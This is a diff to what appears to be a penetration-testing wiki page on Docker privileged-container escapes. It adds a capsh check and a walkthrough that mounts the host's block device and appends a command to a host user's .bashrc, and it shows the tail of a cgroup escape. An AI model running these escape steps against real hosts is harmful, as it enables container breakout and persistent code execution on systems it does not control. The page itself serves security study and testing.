@@ -1,6 +1,14 @@
 Running a Docker container with `--privileged` or dangerous capabilities allows privileged operations. 
 
-> The `--privileged` flag gives all [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) to the container, and it also lifts all the limitations enforced by the device cgroup controller. In other words, the container can then do almost everything that the host can do. 
+{% hint style="info" %}
+The `--privileged` flag gives all [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) to the container, and it also lifts all the limitations enforced by the device cgroup controller. In other words, the container can then do almost everything that the host can do. 
+{% endhint %}
+
+You can use the [capsh](https://man7.org/linux/man-pages/man1/capsh.1.html) command to see granted capabilities:
+
+```bash
+$ capsh --print | grep Current
+```
 
 # CAP_SYS_ADMIN
 
@@ -91,11 +99,52 @@ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 cat /output
 ```
 
+## Abusing exposed host directories
+
+Assusme, the `/home` directory is exposed by `/dev/sdb1` within a privileged container. In such case, you can generate a device node for that block device, mount it into the container, and gain access to host's `/home` directory.
+
+```bash
+$ docker run --privileged -it --rm alpine:latest
+/ $ apk update && apk add util-linux
+# ...
+/ $ lsblk
+NAME      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+sda         8:0    0   45G  0 disk
+├─sda1      8:1    0 40.9G  0 part /etc/hosts
+├─sda2      8:2    0   16M  0 part
+├─sda3      8:3    0    2G  0 part
+│ └─vroot 253:0    0  1.2G  1 dm
+├─sda4      8:4    0   16M  0 part
+├─sda5      8:5    0    2G  0 part
+├─sda6      8:6    0  512B  0 part
+├─sda7      8:7    0  512B  0 part
+├─sda8      8:8    0   16M  0 part
+├─sda9      8:9    0  512B  0 part
+├─sda10     8:10   0  512B  0 part
+├─sda11     8:11   0    8M  0 part
+└─sda12     8:12   0   32M  0 part
+sdb         8:16   0    5G  0 disk
+└─sdb1      8:17   0    5G  0 part
+zram0     252:0    0  768M  0 disk [SWAP]
+/ $ mknod /dev/sdb1 block 8 17
+/ $ mkdir /mnt/host_home
+/ $ mount /dev/sdb1 /mnt/host_home
+/ $ echo 'echo "Hello from container land!" 2>&1' >> /mnt/host_home/eric_chiang_m/.bashrc
+```
+
+References:
+- [Writeup: Privileged Containers Aren't Containers](https://ericchiang.github.io/post/privileged-containers/)
+
 # CAP_SYS_MODULE
 
 [CAP_SYS_MODULE](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows the process to load and unload arbitrary kernel modules (`init_module(2)`, `finit_module(2)` and `delete_module(2)` system calls). This could lead to trivial privilege escalation and ring-0 compromise. The kernel can be modified at will, subverting all system security, Linux Security Modules, and container systems.
 
-> CAP_SYS_MODULE capability dropped by Docker in privileged containers.
+{% hint style="info" %}
+CAP_SYS_MODULE capability dropped by Docker in privileged containers.
+{% endhint %}
+
+References:
+- [Writeup: How I Hacked Play-with-Docker and Remotely Ran Code on the Host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)
 
 # CAP_SYS_RAWIO
 
